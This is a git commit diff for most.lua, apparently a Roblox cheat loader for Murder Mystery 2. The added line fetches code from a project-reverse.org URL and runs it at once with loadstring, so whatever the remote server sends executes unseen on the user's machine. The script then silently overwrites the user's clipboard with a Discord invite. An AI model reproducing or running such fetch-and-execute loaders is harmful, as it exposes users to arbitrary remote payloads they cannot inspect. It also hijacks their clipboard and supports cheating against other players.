38a32b297d67e1f08f2207e9ff8028d4f297aa89
leonix <furkan62.bakir@gmail.com>
2026-05-19 19:35:10 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,8 +1,3 @@
-local function script()
-    loadstring(game:HttpGet('loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()'))()
-end
-
-task.spawn(script)
-
-task.wait(15)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
+wait(10)
 setclipboard("https://discord.gg/JU7Zt5cXjY")
